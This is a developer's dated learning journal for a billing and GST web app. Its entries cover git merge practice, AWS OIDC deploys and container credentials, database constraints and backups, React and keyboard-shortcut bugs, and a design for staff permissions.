
### 2026-11-20 — Three tasks in parallel, merged in order, migrations regenerated `#process` `#git` `#database`
- **What happened:** stage 6, P1.4 PR 2 and P1.8 PR 1 ran as three lanes, each in its own worktree. Two lanes each made a new migration on top of 0007. #37 merged first as 0008; #38 then merged `main` in, deleted its migration and regenerated it, so it came out as 0009 chained from 0008. The SQL was byte-identical; only the snapshot chain changed. Merging `main` also needed two fixes no conflict marker showed: two lanes had each added a `CLOCK` token, and a new test from one lane built a settings object without the other lane's new field.
- **Why / what I learned:** a merge with no conflicts can still be broken. The type-check and the full test run after the merge, not the merge itself, are what prove two branches fit together.
- **Say it in an interview:** "I merge one PR at a time. The next one brings `main` in, regenerates its migration so the numbers stay in order, and re-runs every check, because two changes that each pass can still clash."
- **Follow-ups to expect:** why not rebase? (rebasing pushed commits rewrites history; a merge commit is safe and the PR is squashed anyway) How do you know the migration didn't change? (diff the old and new SQL)

### 2026-11-20 — Safety rails that stopped me, on purpose `#process` `#git` `#devops` `#gotcha`
- **What happened:** my instructions for a lane allowed a force-push to its own branch, and the tool's permission check refused to start it; I rewrote them to merge `main` in instead. Later, cancelling a deploy run waiting for approval was refused too, so the owner rejects it in GitHub. The AWS sign-in had also expired (12 hours), and Docker Desktop hadn't started after the laptop restarted, which every database test needs.
- **Why / what I learned:** a refusal is information, not an obstacle to route around. The safe alternative (merge, not force-push; reject in the UI) was always available. Before a session's cloud work: check the sign-in and the tools it relies on.
- **Say it in an interview:** "Our rule is no force-push and no history rewrite. When automation tried one, it was blocked, and the right fix was to change the approach, not the rule."
- **Follow-ups to expect:** when is a force-push acceptable? (your own unshared branch, with `--force-with-lease`, and only with agreement)

### 2026-11-20 — Setting up a deploy gate from the command line, without showing the account ID `#devops` `#github` `#security`
- **What happened:** after `terraform apply` (from a saved plan file, so exactly what was reviewed) created the GitHub OIDC provider and the deploy role, I created the `demo` environment with `gh api`: the owner as required reviewer, `main` as the only deployment branch. The role's ARN contains the account ID, so it went straight from `terraform output -raw deploy_role_arn` into `gh secret set` through a pipe and never appeared on screen or in a log. Then I read the settings back through the API to check them.
- **Why / what I learned:** the deploy role really amounts to root on the server, so the real control is the environment: who approves and which branch may deploy. A workflow that names an environment that doesn't exist makes GitHub create it with no rules, so the environment has to exist before the workflow reaches `main`.
- **Say it in an interview:** "AWS trusts GitHub's OIDC token only for my repo; GitHub only lets `main` use that environment and only after I approve. A kill-switch variable stops any run before it touches AWS."
- **Follow-ups to expect:** what's in the OIDC trust policy? (the token's audience and the `repo:…:environment:demo` subject) Why not store an access key? (keys leak and don't expire)

### 2026-11-20 — Containers can't use the server's IAM role (and that's on purpose) `#aws` `#security` `#docker` `#gotcha` → ADR 0040
- **What happened:** before writing the SES Terraform, I noticed that ADR 0040 said the api would sign SES calls with the EC2 instance role. But the api runs in a Docker container, and stage 5 set the metadata service's hop limit to 1. Docker's bridge network adds a hop, so a container never gets an answer. Sending email would have failed on the server with "Could not load credentials", and the tests missed it because they use a fake mailer. The owner chose a mail-only role: the host assumes it every 20 minutes and writes 1-hour credentials into memory (`/run`), mounted read-only into the api. The SDK reads them through `credential_process`.
- **Why / what I learned:** the hop limit is a security boundary. If every container could reach the instance role, the web server (Caddy) could decrypt every secret in SSM, including the database master password. So each container should get only the permissions it needs. Two SDK facts I checked in the real image instead of assuming: it re-runs `credential_process` only once the credentials it holds expire (not even with 59 s left), and it refuses credentials that have already expired. So the host keeps the file at least 40 minutes fresh.
- **Say it in an interview:** "IMDSv2 with hop limit 1 means containers can't borrow the EC2 role. For SES I created a role that can only send email as one address, assumed it on the host, and passed short-lived credentials into just that one container. No long-lived key exists anywhere, and the web container still has no AWS access at all."
- **Follow-ups to expect:** why not raise the hop limit to 2? (every container would get the server's full permissions) Why not SES SMTP credentials? (a long-lived secret derived from an access key) How long do assumed-role credentials last? (1 hour at most when one role assumes another: role chaining) What's `credential_process`? (an AWS config setting that runs a command which prints credentials as JSON)

### 2026-11-20 — "Insufficient capacity": the cloud can run out of a server size `#aws` `#gotcha` `#devops`
- **What happened:** starting the stopped demo database failed twice with `InsufficientDBInstanceCapacity` (no free `db.t4g.micro` in `ap-south-1b`) and worked on the third try, 6 minutes later. The server failed for a whole hour with `InsufficientInstanceCapacity` (`t4g.small` in `ap-south-1a`), the second day running, so the first deploy couldn't happen. I retried in a background loop every 3 minutes, which stopped on any other error, so an auth failure wouldn't be retried blindly.
- **Why / what I learned:** a stopped instance gives its hardware back, and starting it again needs free capacity of that exact type in that exact Availability Zone. "Stop it when idle to save money" has a cost: it may not come back when you need it. The fixes are a retry, a different instance type, or a different zone. A single-AZ setup can't simply move, so changing zone means replacing the server (fine here, because the server keeps no data).
- **Say it in an interview:** "Stopping instances saves money but gives up the capacity. When AWS had no t4g.small in our zone, the app's design helped: the server is stateless, so moving it to another type or zone is a Terraform change, not a data migration."
- **Follow-ups to expect:** how do big systems avoid this? (Auto Scaling groups across several zones and instance types, capacity reservations, On-Demand Capacity Reservations) Is RDS different? (same idea; Multi-AZ adds a standby but costs double)

### 2026-11-21 — Parallel AI lanes cost tokens: copy less context `#process`
- **What happened:** three background lanes each started as a copy of the whole conversation, and the usage limit stopped one of them mid-check. The owner asked to keep token use down.
- **Why / what I learned:** a parallel worker that inherits the whole history pays for that history on every step. A fresh worker with a short, focused brief and the file paths it needs is far cheaper, and the files (`HANDOFF.md`, plans) already carry the context. Short sessions, closed with the docs updated, also avoid paying for a huge context again and again.
- **Say it in an interview:** "Context is a cost, like memory in a program. I keep the project's state in files, so any session or worker can start small instead of carrying the whole history."
- **Follow-ups to expect:** how do you keep work from being lost when a session stops? (commit and push after every step; the handoff file says exactly where to resume)

### 2026-11-21 — The test fixture had a name the real signup never sets `#testing` `#backend` `#gotcha`
- **What happened:** checking the stock screens in the real app, the history's "By" column was blank for everything the owner did. The API filled it with the user's name, else their username. But signup never asks the owner's name, and owners have no username (they log in by email), so it was `null`. Every API test passed because the test helper that creates an owner also sets their name to "Ramesh". Now each movement also carries the actor's role as a code, and the page shows "Owner" when there's no name. Two tests came first: an owner with no name in the API, and the "Owner" fallback on the page.
- **Why / what I learned:** a test fixture that is "nicer" than real data hides exactly the bugs real data causes. Test data should start from what the real flow creates (here: signup), and add extras only where a test needs them. Clicking through the real app with a brand-new account found what 27 API tests didn't.
- **Say it in an interview:** "My tests built a user the app itself never creates, an owner with a name, so a blank column only showed up when I signed up fresh in the browser. Now the API sends the role as a code and the page translates it, and a test covers the nameless owner."
- **Follow-ups to expect:** why send a role code and not the word "Owner"? (the API sends codes and the page picks the language, ADR 0036) Why not use the email? (staff would see the owner's personal email in the history)

### 2026-11-21 — A PR with a merge conflict gets no checks, and deploy runs wait in line `#cicd` `#github` `#gotcha`
- **What happened:** #40 showed "no checks reported" for a day. It conflicted with `main` in two docs files, and GitHub had never started its checks. Merging `main` in and pushing started them, and they went green. Later, #44 had all five checks green but couldn't merge: `mergeStateStatus` was `BEHIND`, because another PR had merged first and `main` must be included before a merge. And when I rejected a waiting deploy run, the next one appeared at once: the deploy workflow lets only one run at a time through the `demo` environment, so later runs queue behind the first.
- **Why / what I learned:** pull-request checks run on a test merge of the branch with `main`. A conflict means there's nothing to test, so "no checks" can mean "conflict", not "no CI". Requiring up-to-date branches means merging PRs one at a time, each bringing `main` in first. A queue of deploy runs is cleared one by one.
- **Say it in an interview:** "No checks on a PR was a merge conflict in disguise: GitHub tests the merge result, and there wasn't one. I merge `main` in rather than rebasing, so nobody's pushed history is rewritten."
- **Follow-ups to expect:** why merge `main` in instead of rebasing? (rebasing rewrites pushed commits; the PR is squashed on merge anyway) What does `BEHIND` mean? (branch protection requires the branch to contain the latest `main`)

### 2026-11-21 — Keep the instance type, move the zone `#aws` `#devops` `#decision` → ADR 0042
- **What happened:** the owner asked me to decide what to do about `t4g.small` capacity in `ap-south-1a`. I listed the free-plan types (`describe-instance-types --filters free-tier-eligible=true`) and where `t4g.small` is offered (`describe-instance-type-offerings`: all three Mumbai zones). The only other ARM size on the free plan is `t4g.micro` (1 GB, too small once Chromium arrives), and x86 would need images for two architectures. So: keep `t4g.small` and move it to `ap-south-1b`, where the database already is, by switching the server to the other public subnet. A one-off start attempt to test `1a` once more was blocked by the tool's permission check; I didn't route around it, and decided from the facts already gathered.
- **Why / what I learned:** capacity is per type and per zone. A stateless server makes moving cheap: the change replaces the instance, and nothing on it needs saving. Being in the database's zone also removes a hop between zones.
- **Say it in an interview:** "When AWS ran out of my instance type in one zone, I moved the server to the database's zone with a one-line Terraform change. It's stateless, so a replacement costs nothing. I kept the ARM type so CI still builds one architecture."
- **Follow-ups to expect:** what would you do in production? (an Auto Scaling group across zones and several instance types) What if `1b` fails too? (retry at a quieter hour, then add a subnet in `1c`, or build multi-architecture images)

### 2026-11-21 — SES sends only from a verified address `#aws` `#email`
- **What happened:** `terraform apply` created the SES identity for the demo sender along with the mail-only role (6 resources, $0). Until the owner clicked AWS's verification link, `aws sesv2 get-email-identity --query VerifiedForSendingStatus` said `False` (`PENDING`). After the click it said `True` (`SUCCESS`). The address lives only in the git-ignored `terraform.tfvars` and is marked sensitive, so the plan printed it hidden.
- **Why / what I learned:** SES proves you own an address before it lets you send from it, and in the sandbox it also checks that you own every recipient. A personal address in a public repo's infrastructure goes in an ignored variables file, marked sensitive.
- **Say it in an interview:** "The sender is a Terraform variable from an ignored file, marked sensitive so plans hide it. SES won't send until the address is verified, and I check that with one CLI call before relying on email."

### 2026-11-21 — Replacing a server: what Terraform knows and what it doesn't `#aws` `#terraform` `#github` `#gotcha`
- **What happened:** the move to `ap-south-1b` (ADR 0042) was one line, `aws_subnet.public[0]` → `[1]`. The plan said 1 to add, 3 to change, 1 to destroy: a subnet change forces a new instance, and three things that name the instance ID (the deploy role's policy, the nightly-stop role's policy and the stop schedule) update in place. `1b` had capacity at the first try. One thing outside Terraform also names the instance: the GitHub variable `DEMO_INSTANCE_ID` that the deploy workflow reads. I first set it without `--env demo`, which created a second, repo-level copy; the `demo` environment's own copy still held the old ID and would have won. Fixed with `gh variable set … --env demo` and the stray copy deleted. Then the fresh server had Docker but no app, no timers and no DuckDNS update: those come from the deploy's `install.sh`, not the boot script.
- **Why / what I learned:** Terraform follows references it can see (`aws_instance.server.arn`) and updates them in the same apply. It can't see values copied by hand into other systems, so every such copy needs a line in the runbook. In GitHub Actions, an environment variable overrides a repository variable with the same name.
- **Say it in an interview:** "Replacing the server was a one-line change; Terraform re-pointed the IAM policies and the stop schedule at the new instance by itself. The one value it didn't know about was a GitHub environment variable, so that step is now in the runbook's checklist."
- **Follow-ups to expect:** how would you remove the manual step? (manage the GitHub variable with Terraform's GitHub provider, or have the workflow find the instance by tag) Why is a new server empty? (cloud-init installs only the platform; the deploy installs the app, so a fresh server and an old one end up identical after a deploy)

### 2026-11-21 — The first real deploy: OIDC subject in the wrong form `#cicd` `#aws` `#security` `#gotcha` `#mistake`
- **What happened:** the first approved deploy failed at `configure-aws-credentials`: `Could not assume role with OIDC: Not authorized to perform sts:AssumeRoleWithWebIdentity`, twelve tries. The trust policy asked for `sub = repo:aryangupta1811/business-software:environment:demo`. GitHub's API (`…/actions/oidc/customization/sub`) showed the repository uses the **immutable subject**, so the token really says `repo:aryangupta1811@144018864/business-software@1438652891:environment:demo`. One Terraform variable changed, one IAM update applied, and the second run went green: backup step, deploy, live check. Stage 6's tests used a fake AWS CLI, so the real token exchange could only be tested by a real approved run.
- **Why / what I learned:** with OIDC, AWS trusts a claim in a signed token, and the condition must match the claim exactly. When `AssumeRoleWithWebIdentity` is refused, compare the token's `sub` and `aud` with the trust policy before touching anything else. The immutable form also protects against someone re-creating a deleted repository under the same name.
- **Say it in an interview:** "My deploys log in to AWS with GitHub's OIDC token, so no keys are stored. The first real run was refused: the trust policy expected `repo:owner/name`, but my repository sends the immutable form with numeric IDs. I read the live trust policy and GitHub's subject setting, matched them, and kept the condition an exact match."
- **Follow-ups to expect:** why not a wildcard like `repo:owner/*`? (any repository or branch could deploy) Why couldn't CI catch it? (only GitHub can mint the token, and only for a real run in the environment; a fake CLI can't exercise STS)

### 2026-11-21 — First deploy, first backup and first restore drill `#devops` `#database` `#cloud`
- **What happened:** after the zone move and the OIDC fix, release `794fd1f` went live on https://business-software.duckdns.org. `check-live.sh` passed (HTTPS, redirect, CSP, HSTS, cache headers, health). The deploy's own pre-deploy backup was skipped on purpose (`first_backup_release`: the server had no backup service yet), so the first backup was taken by hand, then drilled: restored into a throwaway PostgreSQL on the server, 18 tables and 10 rows, every count matching. The RDS master was checked too: `rolsuper` and `rolbypassrls` both false, which is why backups run as a separate read-only role.
- **Why / what I learned:** a backup is only proven by a restore. A brand-new server is a special case for any "back up before deploying" step: there's nothing installed yet to back up with, and the workflow needs an explicit, one-time way to say so.
- **Say it in an interview:** "Zero data loss is my top requirement, so before any real data goes on the demo I took a backup and restored it in a drill that checks every table's row count. A backup you have never restored is a hope, not a backup."

### 2026-11-21 — Cleaning up worktrees safely on Windows `#git` `#process` `#gotcha`
- **What happened:** eight lane worktrees from the fast track were merged and could go. Before deleting, each was checked: `git status --porcelain` empty, and the local branch tip equal to its merged PR's `headRefOid` (`gh pr view <n> --json headRefOid`), so no commit made after the merge would be lost. `git worktree remove` then unregistered all eight, but ten folders stayed on disk holding only `node_modules` (Windows couldn't delete them in that step). One wouldn't delete at all: "Device or resource busy". A Vite dev server and a `tsc -w` watcher from an earlier Chrome check were still running from it; stopping them freed it. One branch that exists only on the laptop (`backup/p1.3-before-rewrite`) was kept on the owner's word.
- **Why / what I learned:** with squash merges, `git branch --merged` can't tell you a branch is safe to delete, because the squashed commit on `main` has a different hash. Compare the branch tip with the PR's head instead. On Windows, a folder that won't delete usually has a process holding it open; find it by command line (`Get-CimInstance Win32_Process`) rather than forcing the delete.
- **Say it in an interview:** "Before deleting a branch I check it has nothing beyond what was merged. With squash merges that means comparing its tip with the pull request's head, not asking git whether it's merged."

### 2026-11-21 — A discount limit that GST rounding can't break `#backend` `#testing` `#gst` `#decision`
- **What happened:** P1.13's rule says a staff member's discount must stay within their limit, on each line and on the whole bill (`02` #12). The first idea measured "what the customer stopped paying ÷ what they'd have paid". Writing the tests first showed the flaw: GST rounds each tax half to the paisa, so an exact 10% discount can measure a paisa over 10% of the tax-inclusive price, and the cashier would be asked for the owner's password for a discount they were allowed to give. A tolerance of "a paisa or two" would have let a rupee-amount discount slip a paisa over. The fix: a line is compared on its own price basis (₹10 off ₹100 before tax is 10%, no tax involved), and the bill is within the limit when the customer pays at least what the GST engine itself would charge for "limit% off everything". A generated test runs 144 awkward carts (odd prices, every rate, both tax modes, both places of supply) and checks that a percent exactly at the limit always passes, while ₹11.81 off a ₹118 bill at a 10% limit fails.
- **Why / what I learned:** when a rule compares money after rounding, compare it against the same calculation with the limit plugged in, not against a formula. Then both sides round the same way, and "exactly at the limit" means exactly. The same function runs on the screen and, in P1.14, on the server, so they can't disagree.
- **Say it in an interview:** "The staff discount check reuses the GST engine: a bill is within a 10% limit if the customer pays at least what a 10% discount would leave. That way tax rounding can never push an allowed discount over, and a test over a few hundred generated carts proves it."
- **Follow-ups to expect:** why not just a tolerance? (it lets small over-limit discounts through, and the right tolerance depends on the number of lines) How is an owner's approval sized? (`discountShares` rounds each share up, then raises the bill share until the check passes, and a test proves the approval always covers the bill it was made for)

### 2026-11-21 — A catalogue copy whose sync can't miss a late commit `#backend` `#database` `#architecture` `#decision` → ADR 0043
- **What happened:** the billing counter needs a scanned item on the bill in under 200 ms (NFR 5), so it keeps the catalogue in the browser and syncs changes by `items.updated_at`. The API stamps `updated_at` when a change is made, but another counter only sees it when the transaction commits. A sync asking "what changed since my last sync time" would miss a change stamped just before that time and committed just after it. Each sync therefore asks from 60 s before the last `serverTime`, longer than any transaction can live (ADR 0041: 10 s per statement, 15 s idle). The API test opens a transaction, updates an item, runs a sync (which doesn't see it), commits, then shows an exact-time sync misses the change and the overlapping sync finds it.
- **Why / what I learned:** "changed since T" is only safe if every change with a stamp before T was already visible at T, and with concurrent transactions it isn't. An overlap bounded by the longest possible transaction fixes it simply; replacing rows by id makes repeats harmless. The server re-prices at save, so a stale copy can only cause a "prices changed" prompt, never a wrong bill.
- **Say it in an interview:** "Incremental sync by timestamp has a classic race: rows stamped before your last sync can commit after it. I sync from a minute earlier than my last server time, which is longer than any transaction may stay open, and I proved it with a test that holds a transaction open across a sync."
- **Follow-ups to expect:** why not push changes over WebSockets? (still needs a full load and a catch-up after a dropped connection, which is the same sync) Why not a sequence number instead of a time? (a sequence is assigned at write time too, so it has the same commit-order gap; PostgreSQL's commit timestamps or logical replication would avoid it, at more cost)

### 2026-11-21 — A retry check that refused the first try `#backend` `#testing` `#bug` `#gotcha`
- **What happened:** while writing P1.13's catalogue test, setting opening stock with `unitCost: null` answered `422 key_reused` on the very first request. The schema allows `null`; `moveStock` reads it as "use the known cost" (`line.unitCost ?? known`) and stores the item's purchase price; then the idempotency check (ADR 0007 rule 7), which re-reads the movement made with this request key, compared the stored cost with the `null` that was sent, decided it was a different request and rolled everything back. P1.8's tests only ever sent a number or left the field out, and the Stock page does the same, so nothing had hit it. Fixed test-first: the service turns `null` into "not sent" once, at the top, and every later step uses that one value; the schema now says what `null` means.
- **Why / what I learned:** when one input has two spellings of "nothing" (`null` and missing), normalise it once at the edge. Otherwise each layer guesses, and here two layers guessed differently. Testing an endpoint from a new caller (another module's test) finds what its own tests, written with the same assumptions as the code, can't.
- **Say it in an interview:** "A null cost was treated as 'use the default' by one layer and as a literal value by the retry check, so a valid first request looked like a reused key. I normalised null to 'not sent' at the start of the handler and added a test that sends null, retries, and checks both answers match."

### 2026-11-21 — A CHECK constraint that refused every row without a GSTIN `#database` `#sql` `#gotcha`
- **What happened:** the new `customers` table has one check for business customers: a GSTIN must match the format, its first two digits must be the state, and the legal name and address must be there. Written as `gstin ~ '…' and state_code = left(gstin, 2) and legal_name is not null and address is not null`, it refused a plain walk-in customer with no GSTIN at all. The database test caught it on the first run. With `gstin` null, the first two parts are NULL (unknown), but `legal_name is not null` is FALSE, and `NULL and FALSE` is FALSE, so the check failed. Fixed as `gstin is null or (…)`, and `is not distinct from` for the state comparison.
- **Why / what I learned:** a CHECK passes when its result is TRUE **or NULL**, which is why `phone ~ '…'` quietly allows a null phone. That only works while every part of the expression stays NULL. As soon as a condition mixes in `is null` / `is not null` (which never return NULL), say what happens to the optional column explicitly.
- **Say it in an interview:** "SQL uses three-valued logic: a CHECK constraint only fails on FALSE, so a null usually slips through. My constraint combined a regex on an optional column with an `is not null` test, and `NULL and FALSE` is FALSE, so rows without a GSTIN were refused. I write `col is null or (…)` for conditional rules now, and the table test caught it before any code used it."

### 2026-11-21 — A retried "hold bill" that can't make two copies `#backend` `#database` `#idempotency`
- **What happened:** P1.13's held bills live on the server, so a counter's "hold" request can time out and be sent again. Each bill carries a key made when it was started (ADR 0007). A partial unique index, `(business_id, bill_key) where resumed_at is null and discarded_at is null`, allows only one *open* copy of a bill, but lets the same bill be held again after it was resumed. The insert uses `on conflict do nothing`; when nothing comes back, the route reads the open copy and answers with it, so a retry gets the same answer as the first try. A closed bill is never deleted: resuming or discarding sets a timestamp and who did it, and a check constraint makes sure it's closed one way only and always names the closer. Discarding is logged with the lines and total (owner's answer to question 7: a bill rung up, paid in cash and then thrown away is a classic way money goes missing).
- **Why / what I learned:** idempotency belongs in the database, not in "check first, then insert", which two simultaneous retries can both pass. A partial unique index expresses a rule like "one open copy" exactly; the same rule as a plain unique index would have blocked holding a bill twice in its life.
- **Say it in an interview:** "Held bills are keyed by the bill's own ID, and a partial unique index allows only one open copy. The insert does nothing on conflict and the route answers with the existing row, so a retried request is harmless. Nothing is deleted: closing sets a timestamp and who closed it, and throwing a bill away is logged."

### 2026-11-21 — A held F3 still opens Chrome's find bar `#frontend` `#testing` `#gotcha` `#bug`
- **What happened:** the shortcut registry ignored auto-repeat, so a held `F2` didn't run its action twice, and the provider only called `preventDefault` when an action ran. So the first `F3` press was ours, but the repeats that follow while the key is held were "ignored", and ignored keys went on to the browser: Chrome opened its find bar (`F10` focuses the menu bar the same way). The same hole was open whenever a dialog was up. The fix moved the decision into the registry: a key that matches one of our shortcuts is always cancelled, even when it is not run (held, paused, a dialog open); only `Esc` over a dialog and keys typed in an IME word are left alone, because cancelling those would stop the dialog closing or break the word. At the same time the page's keys now pause for any open dialog, a dialog registers its own keys with `inDialog: true`, a key a field already cancelled is ignored, and Chrome's `F5`/`F11`/`F12` (with any modifier) and `Ctrl+Shift+T/W/N/R`, `Ctrl+F4`, `Alt+F4` are refused at registration.
- **Why / what I learned:** "don't act on this key" and "don't let the browser act on this key" are two different decisions. A shortcut system has to answer the second one for every key it owns, not only the ones it ran. Each case has its own test (held, paused, dialog, Esc, IME, a field that already handled it). Also: jsdom understands `dialog:modal` in a selector but its `showModal` polyfill never sets it, so the check is `dialog[open]`, which is exact here because every dialog is opened with `showModal()` (ADR 0026).
- **Say it in an interview:** "My shortcut module ignored key auto-repeat, but I forgot that ignoring a key still lets the browser have it, so holding F3 opened Chrome's find bar. I made the registry cancel every key it owns even when it doesn't run it, with Esc over a dialog as the one exception, and wrote a test for each case."
- **Follow-ups to expect:** why not just cancel every key in the app? (it would block typing, Tab, and the browser's own shortcuts such as reload) Why does a clash only throw in development? (a typo shouldn't take the counter down; production warns and keeps the first key)

### 2026-11-21 — A refused scan glued itself onto the next one `#frontend` `#testing` `#bug`
- **What happened:** on the billing page, Enter in the search box looks the code up and adds the item. When the add was refused (an item with no GST rate, or 1.5 of something sold in whole pieces) the page showed the reason but left the code in the box, so the next scan was typed after it: `SOAP1.5*8901234567890`, which matched nothing. A test that scanned four refused codes in a row caught it.
- **Why / what I learned:** a scanner types straight into whatever has the focus and presses Enter; it can't clear the box first. So every outcome of Enter, good or bad, must leave the box empty, with the message shown beside it instead. I moved the clearing to the top of the Enter handler rather than into each success branch.
- **Say it in an interview:** "Scanners are keyboards with no judgement. My handler only cleared the search box when an item was added, so after a refused scan the next barcode got appended to the old text. I made every Enter clear the box and show the reason separately, and kept a test that scans several refused codes in a row."
- **Follow-ups to expect:** why not clear the box when the message shows? (the message is state; the clearing belongs to the action that consumed the input) How do you tell a scan from typing? (`ScanBuffer`: keys under 50 ms apart ending in Enter)

### 2026-11-21 — Following a prop without an effect: re-pricing the bill after a sync `#frontend` `#react`
- **What happened:** when the catalogue copy syncs and a price changed, the open bill's lines must take the new price and mark it. My first version did `setBill` inside a `useEffect` on the copy's version; React's lint rule (`react-hooks/set-state-in-effect`) refused it, because the screen would draw once with the old prices and again with the new ones.
- **Why / what I learned:** React's docs have a pattern for "adjust state when a prop changes": keep the last seen value in state and compare while rendering (`if (pricedAt !== version) { setPricedAt(version); … }`). React throws away that render's output and re-renders at once, so the stale prices never reach the screen. The catalogue copy itself is a mutable object updated in place, so a `version` number tells React when to recompute.
- **Say it in an interview:** "Effects are for syncing with things outside React. Deriving state from a prop in an effect costs an extra render with stale data, so I used the documented 'store the previous prop' pattern, and a version counter for the mutable catalogue copy."
- **Follow-ups to expect:** why keep the catalogue in a mutable object at all? (5,000 items: copying a map on every sync would be wasteful, and lookups must be O(1) for the 200 ms scan target)

### 2026-11-21 — `autoFocus` that did nothing, and a rupee sign printed twice `#frontend` `#react` `#testing` `#gotcha`
- **What happened:** the held-bills dialog is a list you move through with ↑↓ and Enter. I put `autoFocus` on the `<ul>`, and the test's Enter went to the search box behind the dialog instead. Separately, the page showed "₹₹25.00": I had written `₹{formatPaise(…)}`, but `formatPaise` already adds the sign. A test checking `toHaveTextContent('₹25.00')` still passed, because it matches a substring.
- **Why / what I learned:** React's `autoFocus` is only applied to form controls (input, button, select, textarea); on a `<ul>` with `tabIndex` it's silently ignored. So the list takes focus in an effect, after the dialog's own effect has called `showModal()` (a child's effects run before its parent's). For the double sign: a helper that formats should own the whole format, and a substring assertion can hide a doubled prefix, so the test now checks the exact formatted text.
- **Say it in an interview:** "Two small UI bugs taught me two habits. React only auto-focuses form fields, so focus management for custom widgets goes in an effect with the order of effects in mind. And substring assertions hide duplicated prefixes, so I assert on the exact formatted string the formatter produces."
- **Follow-ups to expect:** why not let `showModal()` pick the focus? (it focuses the first focusable element, which here was a row's button, not the list that handles the arrows)

### 2026-11-21 — A job queue with its own database role, and the backup it would have broken `#backend` `#database` `#security` `#devops` `#gotcha` → ADR 0022
- **What happened:** P2.7 part 1 gives the worker a job queue, pg-boss, which lives in PostgreSQL. It creates tables while running and deletes finished jobs, which the app's runtime role must never do, so the bootstrap makes a third role `app_queue` that owns only a schema `pgboss`. Tests prove both walls: `app_queue` is refused (`42501`) on business tables, the login map and migration history, and `app_runtime` can't read, write or create anything in `pgboss`. pg-boss starts with `createSchema: false` (by default it runs `CREATE SCHEMA IF NOT EXISTS`, and PostgreSQL checks the right to create schemas before it checks that the schema exists). A test sends a job as `app_queue` and the worker finishes it. Two things the plan didn't mention turned up while running the whole suite: (1) the role file can't be part of `create-roles.sql` alone, because on RDS that file is skipped once the database exists, so it is a separate file that is safe to run again, like the backup role's; (2) the nightly backup (`pg_dump` as the read-only `app_backup`) broke by itself the moment the empty `pgboss` schema existed: the dump names its owner `app_queue`, and the restore drill's empty server has no such role. The fix is to leave the scratch schema out of the dump and the row counts.
- **Why / what I learned:** a new schema is a new thing every backup, restore and role script must know about, so run the existing restore drill tests as soon as one appears. And a role that must create objects is safest in a schema of its own, where the worst it can damage is scratch data. Creating a schema owned by another role needs the creator to be able to `SET ROLE` to it (PostgreSQL 16+), so the script lends `app_queue` to `app_owner` for one statement and takes it back; a test checks nothing is left lent.
- **Say it in an interview:** "My job queue needs table-creation and delete rights, so it logs in as its own role that owns only a `pgboss` schema, and my tests prove it can't read business tables and the app's role can't touch the queue. Adding the schema broke my nightly backup restore, because the dump named a role the empty restore server didn't have. The drill tests caught it before deploy, and the queue's scratch data is excluded since the outbox table keeps the permanent record."
- **Follow-ups to expect:** why not one role with more rights? (the role that touches business data would also get CREATE, and owners skip row-level security) What if a job is lost? (delivery is at least once; the outbox table is the permanent record and can be replayed) Why a bounded retry at startup? (a server may boot before its database, but a worker with no queue should fail loudly, not sit idle)


### 2026-11-22 — Staff permissions: store the changes from the defaults, not the list `#database` `#architecture` `#security` `#decision` → ADR 0044
- **What happened:** P1.5 lets the owner choose what each cashier may do. The obvious design stores each person's full permission list. But every later module adds permissions, and some are on for staff by default (recording an udhaar payment). A login made before that module would miss the permission, and a migration can't fix it: the migration role sees no `users` rows under forced row-level security. So each login stores only two arrays, `permissions_added` and `permissions_removed`, and the effective set is `((defaults ∪ added) − removed)`, minus any switch whose parent is off, plus `session.own`. The defaults live in code (`STAFF_SWITCHES`). The database does not check the names, because the list would need a migration with every module; Zod checks them on the way in and the reader ignores any name it doesn't know or that is owner-only, so bad data can never grant anything.
- **Why / what I learned:** where a default lives decides who it applies to. A default in code applies to everyone who never made a choice, including people created before the feature existed; a stored full list freezes the past. I also learned to write the "can't grant by accident" rule as a test (a stored `staff.manage` is ignored) rather than rely on the writer being careful.
- **Say it in an interview:** "I store only the owner's changes from the defaults, so a permission a later module adds takes its default for every existing login with no migration, and the sensitive ones are simply off. The effective list is one pure function shared by the API and the screens, and anything stored that it doesn't recognise is ignored, so the table can't be used to grant something by mistake."
- **Follow-ups to expect:** what if you change a default later? (it changes what unchosen logins can do: a product decision to log) Why not a Postgres enum or check on the names? (a migration per module; the code is the real guard)

### 2026-11-22 — Permissions read on every request, so there is nothing to invalidate `#backend` `#security` `#architecture` `#decision` → ADR 0044
- **What happened:** when the owner takes a permission away from a cashier who is logged in on two counters, the next click on either must be refused. I rejected copying the permissions into the session row (every open session would have to be found and updated) and a cache (it can be stale, which here means a removed permission still works). The session lookup already joins `users` to check for deactivation, so it also selects the two permission arrays and the guard builds `caller.permissions` from them on every request. The API test uses one cookie: take `items.view` away, and the very next `GET /api/items/context` with the same cookie is `403 forbidden`.
- **Why / what I learned:** the cheapest way to never serve stale data is to have no copy. The cost is two extra columns on a row the request reads anyway. The trade-off I accepted knowingly: a permission change does not end the session (the person is still trusted), but a password reset or deactivation does, in the same transaction.
- **Say it in an interview:** "Authorization data is read from the database on every request, together with the row the session check already reads, so a change by the owner applies to the next click on every counter with no cache to invalidate. Revoking trust (deactivate, password reset) also ends sessions; narrowing permissions doesn't need to."
- **Follow-ups to expect:** what does that cost at scale? (one indexed row lookup that was happening anyway; if it ever hurt, a short-lived cache keyed by user and bumped on change is the next step, with a test for the bump) How does the screen find out? (`GET /api/session` on focus and after a 403)

### 2026-11-22 — The owner's password gate, and a test that taught me what a reset does `#backend` `#testing` `#gotcha`
- **What happened:** the owner's password protects only the staff routes that give someone more power (add a login, change switches, set a password, reactivate). Deactivating takes power away, so it works without a password in one second. I wrote each route's rule into a test (missing, wrong, right) and checked that a wrong password changes nothing and adds no log row. Validation with no side effects (a bad switch set, a weak password) runs before the password check, so a typo doesn't use up one of the ten allowed attempts. Then my log test failed: it expected `user.logged_out` with cause `deactivated` but got `reset`, because the password reset earlier in the same scenario had already ended that cashier's session, so the deactivation had nothing left to end. The test needed a fresh login in between.
- **Why / what I learned:** order matters inside a long scenario test, and an assertion that fails with a surprising value is usually telling you what really happened (here, that a reset ends sessions, which is also correct).
- **Say it in an interview:** "I gate exactly the actions that increase someone's power behind the owner's password, rate-limited per session, and test the negative: a wrong password leaves the data and the audit log untouched."
- **Follow-ups to expect:** why not gate deactivate too? (a fast way to lock someone out is a safety feature; the owner's password is for things an unlocked screen shouldn't be able to grant)

### 2026-11-22 — Hiding is help, the server is the lock: refetching permissions on focus and on 403 `#frontend` `#security` `#architecture`
